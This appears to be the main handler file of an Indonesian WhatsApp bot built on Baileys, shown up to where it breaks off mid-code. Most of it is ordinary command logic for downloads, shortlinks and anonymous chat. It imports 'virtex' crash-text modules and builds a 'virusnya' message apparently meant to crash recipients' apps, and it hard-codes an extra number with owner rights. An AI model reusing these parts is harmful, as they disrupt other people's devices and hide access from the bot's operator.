// CREATE BY LEXXY OFFICIAL

"use strict";
const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  proto,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType,
} = require("@adiwajshing/baileys");
const {
  downloadContentFromMessage,
  generateWAMessage,
  generateWAMessageFromContent,
  MessageType,
  buttonsMessage,
} = require("@adiwajshing/baileys");
const { exec, spawn } = require("child_process");
const {
  color,
  bgcolor,
  pickRandom,
  randomNomor,
} = require("./function/Data_Server_Bot/Console_Data");
const {
  removeEmojis,
  bytesToSize,
  getBuffer,
  fetchJson,
  getRandom,
  getGroupAdmins,
  runtime,
  sleep,
  makeid,
  isUrl,
  generateProfilePicture,
} = require("./function/func_Server");
const {
  TelegraPh,
  UploadFileUgu,
  AnonFiles,
} = require("./function/uploader_Media");
const {
  addResponList,
  delResponList,
  isAlreadyResponList,
  isAlreadyResponListGroup,
  sendResponList,
  updateResponList,
  getDataResponList,
} = require("./function/func_Addlist");
const {
  media_JSON,
  mess_JSON,
  setting_JSON,
  antilink_JSON,
  db_user_JSON,
  server_eror_JSON,
  welcome_JSON,
  db_menfes_JSON,
  db_respon_list_JSON,
  auto_downloadTT_JSON,
} = require("./function/Data_Location.js");
const { mediafireDl } = require("./function/scrape_Mediafire");
const { webp2mp4File } = require("./function/Webp_Tomp4");
const { cerpen } = require("./function/Search_Cerpen");
const {
  bioskop,
  bioskopNow,
  latinToAksara,
  aksaraToLatin,
  gempa,
  gempaNow,
  jadwalTV,
  listJadwalTV,
  jadwalsholat,
} = require("@bochilteam/scraper");
const {
  listmenu,
  rulesBot,
  donasiBot,
  infoOwner,
  allmenu,
  mainmenu,
  usermenu,
  storemenu,
  autodectmenu,
  downloadermenu,
  bugvipmenu,
  randomcekmenu,
  toolsmenu,
  sertifikatmenu,
  logomakermenu,
  anonymousemenu,
  sosmedshopmenu,
  vokalmenu,
  randomenu,
  primbonmenu,
  asupangachamenu,
  audiochangermenu,
  informationmenu,
  randomstickermenu,
  audiomenu,
  funmenu,
  walpapermenu,
  animemenu,
  cerpenmenu,
  nsfwmenu,
  soundmenu,
  textpromenu,
  ephotomenu,
  randomimagemenu,
  groupmenu,
} = require("./help");
const { jadibot, listJadibot } = require("./function/jadibot");

// database virtex
const { philips } = require("./function/virtex/philips");
const { virus } = require("./function/virtex/virus");
const { ngazap } = require("./function/virtex/ngazap");

const fs = require("fs");
const ms = require("ms");
const chalk = require("chalk");
const axios = require("axios");
const qs = require("querystring");
const fetch = require("node-fetch");
const colors = require("colors/safe");
const ffmpeg = require("fluent-ffmpeg");
const moment = require("moment-timezone");
const { Primbon } = require("scrape-primbon");
const primbon = new Primbon();

const Exif = require("./function/set_WM_Sticker");
const exif = new Exif();

const msgFilter = require("./function/func_Spam");
const { stalkff, stalkml } = require("./function/func_Stalker");
const mekih = fs.readFileSync("./function/mod.jpg");

let orang_spam = [];
let medianya = [];

const mess = mess_JSON;
const setting = setting_JSON;
const antilink = antilink_JSON;
const db_user = db_user_JSON;
const server_eror = server_eror_JSON;
const welcomeJson = welcome_JSON;
const db_menfes = db_menfes_JSON;
const db_respon_list = db_respon_list_JSON;
const auto_downloadTT = auto_downloadTT_JSON;

const cekUser = (satu, dua) => {
  let x1 = false;
  Object.keys(db_user).forEach((i) => {
    if (db_user[i].id == dua) {
      x1 = i;
    }
  });
  if (x1 !== false) {
    if (satu == "id") {
      return db_user[x1].id;
    }
    if (satu == "name") {
      return db_user[x1].name;
    }
    if (satu == "seri") {
      return db_user[x1].seri;
    }
    if (satu == "premium") {
      return db_user[x1].premium;
    }
  }
  if (x1 == false) {
    return null;
  }
};

moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = async (conn, msg, m, setting, store) => {
  try {
    let { ownerNumber, botName, smm_dana_nama, smm_dana_number } = setting;
    const { type, quotedMsg, mentioned, now, fromMe, isBaileys } = msg;
    if (msg.isBaileys) return;
    const jam = moment.tz("asia/jakarta").format("HH:mm:ss");
    const tanggal = moment().tz("Asia/Jakarta").format("ll");
    let dt = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a");
    const ucapanWaktu = "Selamat " + dt.charAt(0).toUpperCase() + dt.slice(1);
    const content = JSON.stringify(msg.message);
    const from = msg.key.remoteJid;
    const time = moment(new Date()).format("HH:mm");
    var chats =
      type === "conversation" && msg.message.conversation
        ? msg.message.conversation
        : type === "imageMessage" && msg.message.imageMessage.caption
        ? msg.message.imageMessage.caption
        : type === "videoMessage" && msg.message.videoMessage.caption
        ? msg.message.videoMessage.caption
        : type === "extendedTextMessage" && msg.message.extendedTextMessage.text
        ? msg.message.extendedTextMessage.text
        : type === "buttonsResponseMessage" &&
          quotedMsg.fromMe &&
          msg.message.buttonsResponseMessage.selectedButtonId
        ? msg.message.buttonsResponseMessage.selectedButtonId
        : type === "templateButtonReplyMessage" &&
          quotedMsg.fromMe &&
          msg.message.templateButtonReplyMessage.selectedId
        ? msg.message.templateButtonReplyMessage.selectedId
        : type === "messageContextInfo"
        ? msg.message.buttonsResponseMessage?.selectedButtonId ||
          msg.message.listResponseMessage?.singleSelectReply.selectedRowId
        : type == "listResponseMessage" &&
          quotedMsg.fromMe &&
          msg.message.listResponseMessage.singleSelectReply.selectedRowId
        ? msg.message.listResponseMessage.singleSelectReply.selectedRowId
        : "";
    if (chats == undefined) {
      chats = "";
    }
    const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats)
      ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi)
      : "#";
    const isGroup = msg.key.remoteJid.endsWith("@g.us");
    const sender = isGroup
      ? msg.key.participant
        ? msg.key.participant
        : msg.participant
      : msg.key.remoteJid;
    const isOwner = [
      `${setting.ownerNumber}`,
      "6128126915328@s.whatsapp.net",
    ].includes(sender)
      ? true
      : false;
    const pushname = msg.pushName;
    const body = chats.startsWith(prefix) ? chats : "";
    const args = body.trim().split(/ +/).slice(1);
    const q = args.join(" ");
    const isCommand = body.startsWith(prefix);
    const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
    const isCmd = isCommand
      ? body.slice(1).trim().split(/ +/).shift().toLowerCase()
      : null;
    const botNumber = conn.user.id.split(":")[0] + "@s.whatsapp.net";

    const groupMetadata = isGroup ? await conn.groupMetadata(from) : "";
    const groupName = isGroup ? groupMetadata.subject : "";
    const groupId = isGroup ? groupMetadata.id : "";
    const participants = isGroup ? await groupMetadata.participants : "";
    const groupMembers = isGroup ? groupMetadata.participants : "";
    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : "";
    const isPremium = isOwner || cekUser("premium", sender) == true;
    const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
    const isGroupAdmins = groupAdmins.includes(sender);
    const isWelcome = isGroup ? welcomeJson.includes(from) : false;
    const isAntiLink = antilink.includes(from) ? true : false;
    const isAutoDownTT = auto_downloadTT.includes(from) ? true : false;

    const quoted = msg.quoted ? msg.quoted : msg;
    var dataGroup =
      type === "buttonsResponseMessage"
        ? msg.message.buttonsResponseMessage.selectedButtonId
        : "";
    var dataPrivate =
      type === "messageContextInfo"
        ? msg.message.buttonsResponseMessage?.selectedButtonId ||
          msg.message.listResponseMessage?.singleSelectReply.selectedRowId
        : "";
    const isButton = dataGroup.length !== 0 ? dataGroup : dataPrivate;
    var dataListG =
      type === "listResponseMessage"
        ? msg.message.listResponseMessage.singleSelectReply.selectedRowId
        : "";
    var dataList =
      type === "messageContextInfo"
        ? msg.message.buttonsResponseMessage?.selectedButtonId ||
          msg.message.listResponseMessage?.singleSelectReply.selectedRowId
        : "";
    const isListMessage = dataListG.length !== 0 ? dataListG : dataList;

    const isImage = type == "imageMessage";
    const isQuotedMsg = type == "extendedTextMessage";
    const isMedia = type === "imageMessage" || type === "videoMessage";
    const isQuotedImage = isQuotedMsg
      ? content.includes("imageMessage")
        ? true
        : false
      : false;
    const isVideo = type == "videoMessage";
    const isQuotedVideo = isQuotedMsg
      ? content.includes("videoMessage")
        ? true
        : false
      : false;
    const isSticker = type == "stickerMessage";
    const isQuotedSticker = isQuotedMsg
      ? content.includes("stickerMessage")
        ? true
        : false
      : false;
    const isQuotedAudio = isQuotedMsg
      ? content.includes("audioMessage")
        ? true
        : false
      : false;

    const mentionByTag =
      type == "extendedTextMessage" &&
      msg.message.extendedTextMessage.contextInfo != null
        ? msg.message.extendedTextMessage.contextInfo.mentionedJid
        : [];
    const mentionByReply =
      type == "extendedTextMessage" &&
      msg.message.extendedTextMessage.contextInfo != null
        ? msg.message.extendedTextMessage.contextInfo.participant || ""
        : "";
    const mention =
      typeof mentionByTag == "string" ? [mentionByTag] : mentionByTag;
    mention != undefined ? mention.push(mentionByReply) : [];
    const mentionUser = mention != undefined ? mention.filter((n) => n) : [];

    try {
      var pp_user = await conn.profilePictureUrl(sender, "image");
    } catch {
      var pp_user =
        "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg";
    }

    const PathAuto = "./function/menuPath/";

    function mentions(teks, mems = [], id) {
      if (id == null || id == undefined || id == false) {
        let res = conn.sendMessage(from, { text: teks, mentions: mems });
        return res;
      } else {
        let res = conn.sendMessage(
          from,
          { text: teks, mentions: mems },
          { quoted: msg }
        );
        return res;
      }
    }

    function monospace(string) {
      return "```" + string + "```";
    }

    function parseMention(text = "") {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(
        (v) => v[1] + "@s.whatsapp.net"
      );
    }

    const virusnya = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "" } : {}),
      },
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
          mimetype: "application/octet-stream",
          fileSha256: "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
          fileLength: "64455",
          pageCount: 1,
          mediaKey: "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
          fileName: `GuraBot-MD ${ngazap(prefix)}`,
          fileEncSha256: "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
        },
      },
    };

    const q1 = q.split("&")[0];
    const q2 = q.split("&")[1];
    const q3 = q.split("&")[2];

    const isEmoji = (emo) => {
      let emoji_ranges =
        /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
      let regexEmoji = new RegExp(emoji_ranges, "gi");
      return emo.match(regexEmoji);
    };

    const reply = (teks) => {
      conn.sendMessage(from, { text: teks }, { quoted: msg });
    };

    if (isGroup && isAntiLink) {
      if (!isBotGroupAdmins) return reply("Untung Bot Bukan Admin");
      var linkgce = await conn.groupInviteCode(from);
      if (chats.includes(`https://chat.whatsapp.com/${linkgce}`)) {
        reply(
          `\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`
        );
      } else if (chats.match(/(chat.whatsapp.com)/gi)) {
        let bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`;
        if (isGroupAdmins) return reply(bvl);
        if (fromMe) return reply(bvl);
        if (isOwner) return reply(bvl);
        await conn.sendMessage(from, { delete: msg.key });
        mentions(
          `「 ANTILINK 」\n\n@${
            sender.split("@")[0]
          } Kamu mengirim link group, maaf bot akan kick kamu dari grup`,
          [sender]
        );
        await sleep(3000);
        conn.groupParticipantsUpdate(from, [sender], "remove");
      } else {
      }
    }

    if (isGroup && isAutoDownTT) {
      if (chats.match(/(tiktok.com)/gi)) {
        reply("Url tiktok terdekteksi\nWait mengecek data url.");
        await sleep(3000);
        var tt_res = await fetchJson(
          `https://saipulanuar.ga/api/download/tiktok2?url=${chats}&apikey=jPHjZpQF`
        );
        reply(`𝗧𝗜𝗞𝗧𝗢𝗞 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗

𝘼𝙪𝙩𝙝𝙤𝙧: Lexxy Official
𝙅𝙪𝙙𝙪𝙡: ${tt_res.result.judul}
𝙎𝙤𝙪𝙧𝙘𝙚: ${chats}

Video sedang dikirim...`);
        conn.sendMessage(
          sender,
          {
            video: { url: tt_res.result.video.link1 },
            caption: "No Watermark!",
          },
          { quotes: msg }
        );
        if (isGroup)
          return conn.sendMessage(
            from,
            { text: "Media sudah dikirim lewat chat pribadi bot." },
            { quoted: msg }
          );
      }
    }

    if (!isCmd && isGroup && isAlreadyResponList(from, chats, db_respon_list)) {
      var get_data_respon = getDataResponList(from, chats, db_respon_list);
      if (get_data_respon.isImage === false) {
        conn.sendMessage(
          from,
          { text: sendResponList(from, chats, db_respon_list) },
          {
            quoted: msg,
          }
        );
      } else {
        conn.sendMessage(
          from,
          {
            image: await getBuffer(get_data_respon.image_url),
            caption: get_data_respon.response,
          },
          {
            quoted: msg,
          }
        );
      }
    }

    const sendContact = (jid, numbers, name, quoted, mn) => {
      let number = numbers.replace(/[^0-9]/g, "");
      const vcard =
        "BEGIN:VCARD\n" +
        "VERSION:3.0\n" +
        "FN:" +
        name +
        "\n" +
        "ORG:;\n" +
        "TEL;type=CELL;type=VOICE;waid=" +
        number +
        ":+" +
        number +
        "\n" +
        "END:VCARD";
      return conn.sendMessage(
        from,
        {
          contacts: { displayName: name, contacts: [{ vcard }] },
          mentions: mn ? mn : [],
        },
        { quoted: quoted }
      );
    };

    function toRupiah(angka) {
      var saldonyeini = "";
      var angkarev = angka.toString().split("").reverse().join("");
      for (var i = 0; i < angkarev.length; i++)
        if (i % 3 == 0) saldonyeini += angkarev.substr(i, 3) + ".";
      return (
        "" +
        saldonyeini
          .split("", saldonyeini.length - 1)
          .reverse()
          .join("")
      );
    }

    let setUser = (satu, dua, tiga) => {
      Object.keys(db_user).forEach((i) => {
        if (db_user[i].id == dua) {
          if (satu == "±id") {
            db_user[i].id = tiga;
            fs.writeFileSync(
              "./database/pengguna.json",
              JSON.stringify(db_user)
            );
          }
          if (satu == "±name") {
            db_user[i].name = tiga;
            fs.writeFileSync(
              "./database/pengguna.json",
              JSON.stringify(db_user)
            );
          }
          if (satu == "±seri") {
            db_user[i].seri = tiga;
            fs.writeFileSync(
              "./database/pengguna.json",
              JSON.stringify(db_user)
            );
          }
          if (satu == "±premium") {
            db_user[i].premium = tiga;
            fs.writeFileSync(
              "./database/pengguna.json",
              JSON.stringify(db_user)
            );
          }
        }
      });
    };

    const cekPesan = (satu, dua) => {
      let x2 = false;
      Object.keys(db_menfes).forEach((i) => {
        if (db_menfes[i].id == dua) {
          x2 = i;
        }
      });
      if (x2 !== false) {
        if (satu == "id") {
          return db_menfes[x2].id;
        }
        if (satu == "teman") {
          return db_menfes[x2].teman;
        }
      }
      if (x2 == false) {
        return null;
      }
    };

    const setRoom = (satu, dua, tiga) => {
      Object.keys(db_menfes).forEach((i) => {
        if (db_menfes[i].id == dua) {
          if (satu == "±id") {
            db_menfes[i].id = tiga;
            fs.writeFileSync(
              "./database/menfess.json",
              JSON.stringify(db_menfes)
            );
          }
          if (satu == "±teman") {
            db_menfes[i].teman = tiga;
            fs.writeFileSync(
              "./database/menfess.json",
              JSON.stringify(db_menfes)
            );
          }
        }
      });
    };

    conn.readMessages([msg.key]);

    if (command === "buatroom") {
      if (cekPesan("id", sender) !== null)
        return reply(
          "Kamu Sedang Didalam roomchat ketik *#stopchat* untuk menghapus sesi chat."
        );
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          id: sender,
          session: "buatroom",
          data: {
            penerima: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply(
          "*Silahkan tulis Nomor WhatsApp yg ingin Di ajak ngobrol*\n\n*Contoh:* 628xxxx"
        );
      } else {
        reply(
          "Kamu Sedang di dalam sesi room chat, menunggu konfirmasi dari penerima."
        );
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "buatroom") {
          if (chats.length === 0) return;
          if (isNaN(chats)) return reply("Hanya angka!");
          data_pathauto.data.penerima = Number(chats);
          if (data_pathauto.data.penerima == sender.split("@")[0])
            return reply("jangan nomor lu");
          if (data_pathauto.data.penerima == botNumber.split("@")[0])
            return reply("itu kan nomor bot");
          var cekap = await conn.onWhatsApp(chats + "@s.whatsapp.net");
          if (cekap.length == 0)
            return reply(
              `Nomor +${chats}\ntidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`
            );
          data_pathauto.session = "number_orang";
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          var penerimanyo = data_pathauto.data.penerima + "@s.whatsapp.net";
          mentions(
            `Berhasil mengirimkan undangan chat ke @${
              penerimanyo.split("@")[0]
            } tunggu dia menyetujui undangan tersebut untuk chatan secara anonim jadi dia tidak tau siapa anda`,
            [penerimanyo]
          );
          let roomC = `#${makeid(10)}`;
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
          var text_tersambung = `*Seseorang Mengajak Chating*\n\n*Dari:* Rahasia\n\nSilahkan klik button ya kak jika ingin menghubungkan chat *ANONYMOUS*`;
          let btn_room = [
            {
              buttonId: `${prefix}buat_room_chat ${sender}|${data_pathauto.data.penerima}@s.whatsapp.net|${roomC}`,
              buttonText: { displayText: "Terima️" },
              type: 1,
            },
          ];
          var but_room = {
            text: text_tersambung,
            footer: "Klik button untuk menerima chat.",
            buttons: btn_room,
            mentions: [penerimanyo],
            headerType: 1,
          };
          conn.sendMessage(
            `${data_pathauto.data.penerima}@s.whatsapp.net`,
            but_room
          );
        }
      }
    } else if (command === "setnamabot") {
      if (!isOwner) return reply(mess.OnlyOwner);
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "setnamebot",
          data: {
            nama_baru: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply("*Ok siap ownerku*\n*Tulis nama bot baru ya*");
      } else {
        reply("nama bot nya mana kak?");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "setnamebot") {
          if (chats.length === 0) return;
          data_pathauto.data.nama_baru = chats;
          data_pathauto.session = "nama_barunya";
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          reply(`*SETNAMABOT SUKSES*
_*ID:* @${sender.split("@")[0]}_
_*Nama Lama:* ${setting.botName}_
_*Nama Baru:* ${data_pathauto.data.nama_baru}_
_*Waktu:* ${jam} WIB_`);
          await sleep(2000);
          setting.botName = data_pathauto.data.nama_baru;
          fs.writeFileSync("./config.json", JSON.stringify(setting, null, 2));
          await sleep(2000);
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    } else if (command === "changename") {
      if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "changename",
          data: {
            nama_baru: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply("*namalu apa? biar bot ganti*");
      } else {
        reply("nama nya mana kak?");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "changename") {
          if (chats.length === 0) return;
          data_pathauto.data.nama_baru = chats;
          data_pathauto.session = "nama_barunya";
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          reply(`*SETNAMA SUKSES*
_*ID:* @${sender.split("@")[0]}_
_*Nama Lama:* ${cekUser("name", sender)}_
_*Nama Baru:* ${data_pathauto.data.nama_baru}_
_*Waktu:* ${jam} WIB_`);
          await sleep(1000);
          setUser("±name", sender, data_pathauto.data.nama_baru);
          await sleep(2000);
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    } else if (command === "bitly_short") {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "bitly_shortlink",
          data: {
            trannss: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply(
          "*Silahkan kirim url yang ingin di shortilink ke bitly.*\n\n*Contoh:* https://google.com"
        );
      } else {
        reply("Link url nya mana kak?");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "bitly_shortlink") {
          if (chats.length === 0) return;
          data_pathauto.data.trannss = chats;
          let ii = await fetchJson(
            `https://danzzapi.xyz/api/shortlink/bitly?url=${data_pathauto.data.trannss}&apikey=danzz`
          );
          if (ii.status == false)
            return reply("url tidak valid\nsilahkan kirim yg benar.");
          data_pathauto.session = "input_texttttranss";
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          reply(`*SHORTLINK*

*TYPE*
https://bitly.com/

*TIME*
${time} WIB

*HASIL*
${ii.result}

*ORIGINAL* 
${data_pathauto.data.trannss}`);
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    } else if (command === "tinyurl_short") {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "tinyurl_shortlink",
          data: {
            trannss: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply(
          "*Silahkan kirim url yang ingin di shortilink ke tinyurl.*\n\n*Contoh:* https://google.com"
        );
      } else {
        reply("Link url nya mana kak?");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "tinyurl_shortlink") {
          if (chats.length === 0) return;
          data_pathauto.data.trannss = chats;
          let ii = await fetchJson(
            `https://danzzapi.xyz/api/shortlink/tinyurl?url=${data_pathauto.data.trannss}&apikey=danzz`
          );
          if (ii.status == false)
            return reply("url tidak valid\nsilahkan kirim yg benar.");
          data_pathauto.session = "input_texttttranss";
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          reply(`*SHORTLINK*

*TYPE*
https://tinyurl.com/

*TIME*
${time} WIB

*HASIL*
${ii.result}

*ORIGINAL* 
${data_pathauto.data.trannss}`);
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    } else if (command === "cuttly_short") {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "cuttly_shortlink",
          data: {
            trannss: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply(
          "*Silahkan kirim url yang ingin di shortilink ke cuttly.*\n\n*Contoh:* https://google.com"
        );
      } else {
        reply("Link url nya mana kak?");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "cuttly_shortlink") {
          if (chats.length === 0) return;
          data_pathauto.data.trannss = chats;
          let ii = await fetchJson(
            `https://danzzapi.xyz/api/shortlink/cuttly?url=${data_pathauto.data.trannss}&apikey=danzz`
          );
          if (ii.status == false)
            return reply("url tidak valid\nsilahkan kirim yg benar.");
          data_pathauto.session = "input_texttttranss";
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          reply(`*SHORTLINK*

*TYPE*
https://cutt.ly/

*TIME*
${time} WIB

*HASIL*
${ii.result}

*ORIGINAL* 
${data_pathauto.data.trannss}`);
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    } else if (command === "translate") {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "translate",
          data: {
            trannss: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply(
          "*Silahkan kirim text yang ingin jadi translate ke inggris.*\n\n*Contoh:* Hai sayang"
        );
      } else {
        reply("Text nya mana kak?");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "translate") {
          if (chats.length === 0) return;
          data_pathauto.data.trannss = chats;

          var en = await fetchJson(
            `https://api.popcat.xyz/translate?to=en&text=${data_pathauto.data.trannss}`
          );
          data_pathauto.session = "input_texttttranss";
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          reply(`*TRANSLATE*
*IND :* ${data_pathauto.data.trannss}
*EN :* ${en.translated}`);
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    } else if (command === "ytmp4") {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "ytmp4",
          data: {
            url_nya: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply(
          "*Silahkan kirim Url/Link YouTube*\n\nContoh: https://youtu.be/watyplEMt90"
        );
      } else {
        reply("Url YouTube nya mana kak?");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "ytmp4") {
          if (chats.length === 0) return;
          data_pathauto.data.url_nya = chats;

          var ytmp4 = await fetchJson(
            `https://saipulanuar.ga/api/download/ytmp4?url=${data_pathauto.data.url_nya}&apikey=jPHjZpQF`
          );
          var xx = ytmp4.result;
          if (ytmp4.status == 500)
            return reply(
              "*Link yg kamu berikan tidak valid*\n*Silahkan kirim url yg valid&benar*"
            );
          data_pathauto.session = "input_urlytmp4";
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          reply(`*YTMP4 DOWNLOAD*

*title:* ${xx.title}
*channel:* ${xx.channel}
*published:* ${xx.published}
*views:* ${xx.views}
*type:* video/mp4

_Sedang mengirim video.._`);
          conn.sendMessage(
            sender,
            { video: { url: xx.url }, caption: "Done!" },
            { quoted: msg }
          );
          if (isGroup)
            return conn.sendMessage(
              from,
              { text: "Video sudah dikirim lewat chat pribadi bot." },
              { quoted: msg }
            );
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    } else if (command === "ytmp3") {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "ytmp3",
          data: {
